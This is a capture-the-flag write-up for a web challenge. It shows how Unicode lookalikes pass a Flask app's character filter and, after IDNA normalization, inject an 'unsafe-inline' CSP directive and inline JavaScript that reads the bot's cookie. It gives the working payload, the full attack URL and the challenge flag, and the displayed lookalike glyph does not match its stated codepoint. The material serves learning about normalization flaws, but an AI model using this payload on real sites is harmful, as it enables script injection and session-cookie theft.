# ForbiddenScriptRitual — Solution

**CTF**: Midnight Flag Exe
**Category**: Web
**Flag**: `MCTF{d28ba1ed8b0d74195002b2844e16d4df}`

## TL;DR

CSP injection via IDNA normalization of Unicode lookalike characters (`;` → U+037E, `'` → U+FF07, `"` → U+FF02) to inject `script-src 'unsafe-inline'` and inline JavaScript that exfiltrates `document.cookie`.

## Analysis

The Flask app has a single route `/` that takes a `domain` query parameter. This parameter is:
1. Validated against `FORBIDDEN_CHARS = ['"', "'", ";", ",", "\n", "\r", "<", ">"]`
2. Parsed with `urlparse()`, hostname extracted
3. Hostname IDNA-encoded: `parsed.hostname.encode("idna").decode()`
4. Injected into both the **CSP header** and **inline JavaScript**

```
Content-Security-Policy: frame-ancestors https://HOSTNAME ; script-src 'self';
```

```html
<script>
    const allow_domain = "frame-ancestors https://HOSTNAME";
    console.log("[DEBUG] Added to csp: "+allow_domain);
</script>
```

The `script-src 'self'` blocks all inline scripts. A bot visits user-provided URLs with a FLAG cookie set on `ritual-app:5000`.

## Vulnerability — CWE-838 (Inappropriate Encoding for Output Context)

The IDNA encoding (`str.encode('idna')`) performs NFKC Unicode normalization, which maps visually similar Unicode characters to their ASCII equivalents:

| Unicode | Codepoint | NFKC Result | Purpose |
|---------|-----------|-------------|---------|
| ͺ       | U+037E    | `;`         | CSP directive separator |
| ＇      | U+FF07    | `'`         | CSP keyword quotes |
| ＂      | U+FF02    | `"`         | JS string delimiter |

These Unicode characters **bypass the FORBIDDEN_CHARS filter** (which only checks ASCII equivalents) but **normalize to their ASCII counterparts** after IDNA encoding.

## Exploit

Craft a `domain` parameter containing Unicode lookalikes that, after IDNA normalization:

1. **CSP injection**: Inserts `; script-src 'unsafe-inline'` — since CSP uses the **first** occurrence of a directive, this overrides the hardcoded `script-src 'self'`
2. **JS injection**: Closes the JS string with `"`, adds `console.log(document.cookie)`, then opens a new empty string `""` to consume the trailing quote

### Payload hostname (pre-IDNA):
```
x.comͺ script-src ＇unsafe-inline＇ ＂ͺconsole.log(document.cookie)ͺ＂
```

### After IDNA normalization:
```
x.com; script-src 'unsafe-inline' ";console.log(document.cookie);"
```

### Resulting CSP header:
```
frame-ancestors https://x.com; script-src 'unsafe-inline' "... ; script-src 'self';
```
→ `script-src 'unsafe-inline'` takes precedence (first wins).

### Resulting JS:
```javascript
const allow_domain = "frame-ancestors https://x.com; script-src 'unsafe-inline' ";console.log(document.cookie);"";
```
→ `console.log(document.cookie)` executes, output relayed by bot.

### URL sent to bot:
```
http://ritual-app:5000/?domain=http%3A//x.com%CD%BE%20script-src%20%EF%BC%87unsafe-inline%EF%BC%87%20%EF%BC%82%CD%BEconsole.log%28document.cookie%29%CD%BE%EF%BC%82
```

## Key Lessons

- IDNA encoding performs NFKC normalization, converting Unicode lookalikes to ASCII — never trust IDNA-processed strings for security-sensitive contexts
- CSP directive injection: when user input appears before a hardcoded directive, the first occurrence wins
- The bot relays `console.log` output, making cookie exfiltration trivial once XSS is achieved

## References

- [Unicode NFKC normalization](https://unicode.org/reports/tr15/)
- [CSP specification — directive ordering](https://www.w3.org/TR/CSP3/#parse-serialized-policy)
- [IDNA encoding security pitfalls](https://www.unicode.org/reports/tr46/)
